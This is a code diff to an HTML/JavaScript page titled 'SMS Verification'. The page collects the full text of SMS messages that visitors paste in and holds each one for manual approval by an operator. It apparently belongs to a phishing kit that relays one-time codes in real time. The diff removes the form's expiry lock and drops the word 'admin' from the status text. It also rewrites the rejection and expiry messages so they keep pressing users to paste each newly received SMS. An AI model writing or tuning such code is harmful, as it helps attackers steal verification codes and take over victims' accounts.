@@ -153,11 +153,11 @@
 <body>
     <div class="container">
         <h1>📱 SMS Verification</h1>
-        <p class="subtitle">Enter the code/message you received via SMS</p>
+        <p class="subtitle">Enter the message you received via SMS</p>
 
         <form id="smsForm">
             <div class="form-group">
-                <label for="smsMessage">📨 SMS Message Received</label>
+                <label for="smsMessage">SMS Message Received</label>
                 <textarea 
                     id="smsMessage" 
                     placeholder="Paste the SMS message you received here..."
@@ -223,12 +223,8 @@
                     timerDisplay.classList.add('expired');
                     countdownDisplay.textContent = '0';
                     
-                    // Disable form
-                    smsMessage.disabled = true;
-                    submitBtn.disabled = true;
-                    submitBtn.textContent = '⏰ Expired';
-                    
-                    showStatus('⏰ The SMS code has expired. Please wait for a new message.', 'expired');
+                    // Just show the message - don't disable anything
+                    showStatus('Please copy the recently received sms.', 'expired');
                 }
             }, 1000);
         }
@@ -239,16 +235,16 @@
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
 
-            // Check if expired
+            // Check if expired - just show message, don't block
             if (isExpired) {
-                showStatus('⏰ The SMS code has expired. Please wait for a new message.', 'expired');
+                showStatus('Please copy the recently received sms.', 'expired');
                 return;
             }
 
             const message = smsMessage.value.trim();
 
             if (!message) {
-                showStatus('Please enter the SMS message you received.', 'error');
+                showStatus('Please copy the recently received sms.', 'error');
                 return;
             }
 
@@ -261,7 +257,7 @@
 
             submitBtn.disabled = true;
             submitBtn.textContent = '⏳ Validating...';
-            showStatus('⏳ Waiting for admin approval...', 'waiting');
+            showStatus('⏳ Waiting for approval...', 'waiting');
 
             try {
                 const response = await fetch('/submit-sms', {
@@ -300,7 +296,7 @@
 
                         if (d.approved === false) {
                             clearInterval(poll);
-                            showStatus('❌ SMS verification rejected. Please try again.', 'error');
+                            showStatus('❌ SMS verification rejected. Please copy recently received sms.', 'error');
                             submitBtn.disabled = false;
                             submitBtn.textContent = '🔍 Validate SMS';
                         }
